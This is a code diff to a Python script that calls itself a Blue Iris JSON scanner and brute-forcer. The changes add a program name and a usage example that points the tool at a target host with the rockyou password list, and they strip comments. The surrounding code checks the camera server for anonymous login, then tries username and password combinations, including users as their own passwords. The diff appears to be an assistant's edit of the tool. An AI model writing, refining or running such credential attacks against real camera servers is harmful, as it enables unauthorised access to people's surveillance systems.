@@ -36,7 +36,11 @@ def load_combo(path):
     return combos
 
 def main():
-    parser = argparse.ArgumentParser(description="Blue Iris Modern JSON Scanner & Brute-Forcer (c0nfigur3/BI-scanner)")
+    parser = argparse.ArgumentParser(
+        prog="blue-i",
+        description="Blue Iris Modern JSON Scanner & Brute-Forcer (c0nfigur3/BI-scanner)",
+        epilog="Example: blue-i -H http://REDACTED:81 -p /usr/share/wordlists/rockyou.txt.gz -v --delay 1"
+    )
     parser.add_argument("-H", "--host", required=True, help="Target URL (e.g. http://REDACTED:81)")
     parser.add_argument("-u", "--users", default="users.txt", help="Username list (default: users.txt)")
     parser.add_argument("-p", "--passwords", default="passwords.txt", help="Password list — supports .txt or .gz")
@@ -46,10 +50,10 @@ def main():
     parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
     args = parser.parse_args()
 
+    # ... (rest of the code stays exactly the same as your current version)
     base_url = args.host.rstrip("/")
     print(f"[*] Targeting Blue Iris @ {base_url}\n")
 
-    # Anonymous access check
     try:
         r = requests.post(f"{base_url}/json", json={"cmd": "login"}, timeout=10)
         data = r.json()
@@ -63,7 +67,6 @@ def main():
     session = requests.Session()
     session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
 
-    # Dynamic combo mode (takes precedence)
     if args.combo:
         print(f"[+] Dynamic combo mode — loading {args.combo}")
         combos = load_combo(args.combo)
@@ -79,7 +82,6 @@ def main():
         print("\n[-] No luck with combo list.")
         sys.exit(1)
 
-    # Regular mode (existing -u / -p) + optional --try-user-as-pass
     try:
         with open(args.users) as f:
             users = [line.strip() for line in f if line.strip()]
@@ -91,7 +93,6 @@ def main():
     print(f"[+] Brute forcing {len(users)} user(s) × {len(passwords):,} password(s)...\n")
 
     for user in users:
-        # Optional dynamic user-as-pass
         if args.try_user_as_pass:
             if args.verbose:
                 print(f"[*] Trying {user}:{user}  (user-as-pass)")
